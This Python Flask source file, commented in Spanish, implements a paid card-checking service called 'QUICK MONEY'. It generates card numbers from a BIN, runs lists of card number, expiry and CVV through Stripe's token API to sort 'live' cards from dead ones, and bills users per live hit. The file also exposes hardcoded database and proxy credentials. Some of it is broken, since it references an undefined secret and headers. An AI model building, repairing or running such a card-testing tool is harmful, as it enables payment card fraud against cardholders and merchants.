import os, random, time, json, requests, base64
from flask import Flask, render_template_string, request, redirect, session, url_for, jsonify
from pymongo import MongoClient

app = Flask(__name__)
app.secret_key = 'quick_money_v42_stripe_direct'

# --- [ CONFIGURACIÓN MAESTRA ] ---
# Usaremos Stripe Direct para saltar el 404 de Snipcart
STRIPE_KEY = "sk_test_51P..." # Aquí pondrás tu Secret Key de Stripe luego
MONGO_URI = "mongodb+srv://mairo:mairo1212@cluster0.inuth4k.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"

# --- [ PROXIES DECODO ] ---
PROXY_USER = 'sp6jzqtaou'
PROXY_PASS = 'rUd7t65FxkK+x3Flhr'
PROXY_URL = f"http://{PROXY_USER}:{PROXY_PASS}@gate.decodo.com:10001"
PROXIES_CONFIG = {'http': PROXY_URL, 'https': PROXY_URL}

try:
    client = MongoClient(MONGO_URI)
    db_mongo = client['quickmoney_db']
    usuarios_col = db_mongo['usuarios']
except Exception as e:
    print(f"Error MongoDB: {e}")

COSTO_LIVE = 0.15

# --- [ MOTOR STRIPE DIRECT (BYPASS TIMEOUT) ] ---
def check_gate_pro(cc):
    try:
        partes = cc.split('|')
        if len(partes) < 4: return {"status": "DEAD", "msg": "FORMATO ERROR"}
        num, mes, ano, cvv = partes[0], partes[1], partes[2], partes[3]
        
      # Configuración de Identidad
        auth_base = base64.b64encode(f"{SNIPCART_SECRET}:".encode()).decode()
        headers["Authorization"] = f"Basic {auth_base}"
        
        payload = {
            "card[number]": num,
            "card[exp_month]": int(mes),
            "card[exp_year]": int(ano),
            "card[cvc]": cvv
        }
        
        # Petición Directa y Autorizada
        response = requests.post(
            'https://api.stripe.com/v1/tokens', 
            data=payload, 
            headers=headers, 
            timeout=10
        )
        
        if response.status_code == 200:
            return {"status": "LIVE", "msg": "AUTHORIZED"}
        else:
            try:
                error_data = response.json().get('error', {})
                # Si Stripe nos dice qué está mal, lo mostramos
                msg = error_data.get('message', 'DECLINED').upper()
                return {"status": "DEAD", "msg": msg}
            except:
                return {"status": "DEAD", "msg": f"STRIPE_REJ_{response.status_code}"}
            
    except Exception:
        return {"status": "DEAD", "msg": "BANC_RETRY"}
# --- [ EL MISMO DISEÑO QUE TE GUSTA ] ---
CSS = """
<style>
    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;700&display=swap');
    :root { --gold: #c5a059; --bg: #000; --card: rgba(10, 10, 12, 0.98); --border: #1a1a1e; --green: #2ecc71; --red: #ff4757; }
    body { background: var(--bg); color: #fff; font-family: 'JetBrains Mono', monospace; margin: 0; padding: 0; min-height: 100vh; overflow-x: hidden; }
    #bg-canvas { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 1; pointer-events: none; opacity: 0.5; }
    .container { max-width: 480px; margin: auto; padding: 20px; position: relative; z-index: 10; }
    .card { background: var(--card); border: 1px solid var(--border); padding: 25px; margin-bottom: 15px; border-radius: 4px; backdrop-filter: blur(10px); }
    .card-h { font-size: 11px; color: var(--gold); text-transform: uppercase; font-weight: bold; border-bottom: 1px solid var(--border); padding-bottom: 10px; margin-bottom: 15px; display: block; letter-spacing: 2px; }
    input, textarea { width: 100%; background: #050505; border: 1px solid var(--border); color: #fff; padding: 15px; margin-bottom: 12px; box-sizing: border-box; font-family: inherit; font-size: 13px; outline: none; }
    .btn { border: none; padding: 18px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 11px; width: 100%; transition: 0.2s; font-family: inherit; border-radius: 2px; }
    .btn-gold { background: var(--gold); color: #000; margin-top: 10px; }
    .btn-dark { background: #0a0a0a; color: #fff; border: 1px solid #1a1a1e; }
    .btn-mini { padding: 6px 10px; width: auto; font-size: 9px; margin: 5px 0; }
    .res-box { border-radius: 2px; padding: 12px; font-size: 11px; min-height: 100px; border: 1px solid #1a1a1e; background: #030303; overflow-y: auto; max-height: 250px; margin-bottom: 10px; }
    .user-list { font-size: 10px; color: #888; text-align: left; max-height: 100px; overflow-y: auto; background: #050505; padding: 10px; border: 1px solid #1a1a1e; }
</style>
"""

CANVAS_JS = """
<script>
    const canvas = document.getElementById('bg-canvas');
    const ctx = canvas.getContext('2d');
    let p = [];
    function init() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
    window.onresize = init; init();
    class Particle {
        constructor() { this.x = Math.random()*canvas.width; this.y = Math.random()*canvas.height; this.s = Math.random()*1.5; this.sx = Math.random()*0.5-0.25; this.sy = Math.random()*0.5-0.25; }
        u() { this.x += this.sx; this.y += this.sy; if(this.x>canvas.width)this.x=0; if(this.y>canvas.height)this.y=0; }
        d() { ctx.fillStyle = 'rgba(197,160,89,0.3)'; ctx.beginPath(); ctx.arc(this.x,this.y,this.s,0,6.28); ctx.fill(); }
    }
    for(let i=0;i<60;i++) p.push(new Particle());
    function anim() { ctx.clearRect(0,0,canvas.width,canvas.height); p.forEach(x=>{x.u();x.d();}); requestAnimationFrame(anim); } anim();
</script>
"""

@app.route('/')
def login():
    if 'user' in session: return redirect(url_for('panel'))
    return render_template_string(f'<html><head><meta name="viewport" content="width=device-width, initial-scale=1">{CSS}</head><body><canvas id="bg-canvas"></canvas><div style="display:flex;align-items:center;justify-content:center;height:100vh;position:relative;z-index:10;"><div class="card" style="width:340px; text-align:center;"><h2 style="letter-spacing:2px; font-size:18px;">⚡️🌩️ QUICK MONEY 🌩️⚡️</h2><span style="color:var(--gold); font-size:10px;">{{ CHK }}</span><br><br><form method="POST" action="/auth"><input name="u" placeholder="USUARIO"><input type="password" name="p" placeholder="PASS"><button class="btn btn-gold">INGRESAR</button></form><br><a href="/register" style="color:var(--gold); font-size:10px; text-decoration:none;">[ CREAR CUENTA ]</a></div></div>{CANVAS_JS}</body></html>')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        u, p, t = request.form.get('u'), request.form.get('p'), request.form.get('t')
        if not usuarios_col.find_one({"u": u}):
            usuarios_col.insert_one({"u": u, "p": p, "saldo": 0.0, "rango": "USER", "telegram": t})
            return redirect(url_for('login'))
    return render_template_string(f'<html><head>{CSS}</head><body><canvas id="bg-canvas"></canvas><div style="display:flex;align-items:center;justify-content:center;height:100vh;position:relative;z-index:10;"><div class="card" style="width:340px; text-align:center;"><h2>REGISTRO</h2><form method="POST"><input name="u" placeholder="USUARIO"><input type="password" name="p" placeholder="PASS"><input name="t" placeholder="TELEGRAM @ID"><button class="btn btn-gold">REGISTRAR</button></form></div></div>{CANVAS_JS}</body></html>')

@app.route('/panel', methods=['GET', 'POST'])
def panel():
    if 'user' not in session: return redirect(url_for('login'))
    u_data = usuarios_col.find_one({"u": session['user']})
    is_admin = session['user'].lower() == "mairo"
    
    all_users = ""
    if is_admin:
        users = usuarios_col.find({}, {"u": 1, "telegram": 1, "saldo": 1})
        all_users = "".join([f"• {u['u']} (@{u.get('telegram','?')}) - ${u['saldo']}<br>" for u in users])

    return render_template_string(f"""
    <html><head><meta name="viewport" content="width=device-width, initial-scale=1">{CSS}</head>
    <body><canvas id="bg-canvas"></canvas><div class="container">
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom: 20px;">
            <div style="font-size:11px;">ID: <b style="color:var(--gold)">{"ADMIN" if is_admin else session['user'].upper()}</b></div>
            <div id="display_saldo" style="border:1px solid var(--gold); padding:8px 15px; color:var(--gold); font-weight:bold;">${u_data['saldo']:.2f}</div>
        </div>

        {f'''<div class="card" style="border:1px solid var(--gold)"><span class="card-h">👑 GESTIÓN DE CLIENTES</span>
            <div class="user-list">{all_users}</div><br>
            <form action="/admin_add_saldo" method="POST">
                <input name="target_user" placeholder="USUARIO">
                <input name="amount" type="number" step="0.01" placeholder="CANTIDAD $">
                <button type="submit" class="btn btn-gold" style="padding:12px;">CARGAR SALDO</button>
            </form></div>''' if is_admin else ""}

        <div class="card"><span class="card-h">🪄 GENERADOR</span>
            <input id="bin_val" placeholder="BIN">
            <button class="btn btn-dark" onclick="generarCC()">GENERAR</button>
            <textarea id="gen_area" rows="3" readonly style="margin-top:10px; color:var(--gold); font-size:11px;"></textarea>
            <button class="btn btn-dark btn-mini" onclick="document.getElementById('check_list').value += document.getElementById('gen_area').value + '\\n'">➕ CARGAR</button>
        </div>

        <div class="card"><span class="card-h">🛡️ GATE STRIPE (REAL)</span>
            <textarea id="check_list" rows="5" placeholder="CC|MM|YY|CVV"></textarea>
            <button class="btn btn-gold" id="btn_start" onclick="startChecking()">🚀 INICIAR CHECK ($0.15)</button>
        </div>

        <div style="display:flex; justify-content:space-between; align-items:center;"><span style="color:var(--green); font-size:10px;">LIVES ✅</span><button class="btn btn-dark btn-mini" onclick="downloadLives()">📥 GUARDAR</button></div>
        <div class="res-box" id="lives_log"></div>
        <div class="res-box" id="dead_log" style="opacity:0.4;"></div>
        <a href="/logout" style="color:#444; text-decoration:none; display:block; text-align:center; margin-top:30px; font-size:10px;">[ CERRAR SESIÓN ]</a>
    </div>{CANVAS_JS}
    <script>
    function generarCC() {{
        let b = document.getElementById('bin_val').value; if(b.length<6) return;
        let c = []; for(let i=0;i<10;i++) {{
            let r = b; while(r.length<16) r+=Math.floor(Math.random()*10);
            c.push(r+"|"+("0"+(Math.floor(Math.random()*12)+1)).slice(-2)+"|"+(2025+Math.floor(Math.random()*6))+"|"+Math.floor(Math.random()*899+100));
        }} document.getElementById('gen_area').value = c.join('\\n');
    }}
    async function startChecking() {{
        let a = document.getElementById('check_list'); let lines = a.value.trim().split('\\n');
        if(!lines[0]) return; document.getElementById('btn_start').disabled = true;
        for (let cc of lines) {{
            let r = await fetch('/validar_card', {{method:'POST', headers:{{'Content-Type':'application/json'}}, body:JSON.stringify({{card:cc}})}});
            let d = await r.json();
            if(d.status === 'LIVE') {{
                document.getElementById('display_saldo').innerText = '$' + d.nuevo_saldo.toFixed(2);
                document.getElementById('lives_log').innerHTML = '<div style="color:var(--green); padding:5px 0;">'+cc+' | AUTHORIZED</div>' + document.getElementById('lives_log').innerHTML;
            }} else {{
                document.getElementById('dead_log').innerHTML = cc + ' | ' + d.msg + '<br>' + document.getElementById('dead_log').innerHTML;
            }}
            await new Promise(r => setTimeout(r, 1200));
        }}
        document.getElementById('btn_start').disabled = false;
    }}
    function downloadLives() {{ let d = document.getElementById('lives_log').innerText; if(!d) return; let blob = new Blob([d], {{type:'text/plain'}}); let a = document.createElement('a'); a.href=URL.createObjectURL(blob); a.download='lives.txt'; a.click(); }}
    </script></body></html>
    """)

@app.route('/admin_add_saldo', methods=['POST'])
def admin_add_saldo():
    if session.get('user', '').lower() != "mairo": return redirect(url_for('panel'))
    target = request.form.get('target_user').strip()
    amount = float(request.form.get('amount', 0))
    usuarios_col.update_one({"u": target}, {"$inc": {"saldo": amount}})
    return redirect(url_for('panel'))

@app.route('/validar_card', methods=['POST'])
def validar():
    u_data = usuarios_col.find_one({"u": session['user']})
    if u_data['saldo'] < COSTO_LIVE: return jsonify({"status":"DEAD", "msg": "SIN SALDO"})
    cc = request.json.get('card', '')
    res = check_gate_pro(cc)
    if res['status'] == 'LIVE':
        new_s = round(u_data['saldo'] - COSTO_LIVE, 2)
        usuarios_col.update_one({"u": session['user']}, {"$set": {"saldo": new_s}})
        return jsonify({"status": "LIVE", "nuevo_saldo": new_s})
    return jsonify({"status": "DEAD", "msg": res['msg']})

@app.route('/auth', methods=['POST'])
def auth():
    u, p = request.form.get('u'), request.form.get('p')
    if usuarios_col.find_one({"u": u, "p": p}): session['user'] = u
    return redirect(url_for('panel'))

@app.route('/logout')
def logout(): session.clear(); return redirect(url_for('login'))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
